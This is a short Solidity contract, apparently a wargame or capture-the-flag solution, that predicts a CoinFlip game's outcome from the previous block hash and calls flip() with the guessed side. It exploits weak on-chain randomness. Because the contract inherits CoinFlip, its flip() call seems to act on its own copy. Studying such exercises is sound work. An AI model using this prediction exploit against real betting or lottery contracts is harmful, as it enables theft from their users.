// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./CoinFlip.sol";

contract HackCoinFlip is CoinFlip {
    bool public side;

    function hack() public {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        side = coinFlip == 1 ? true : false;
        flip(side);
    }
}
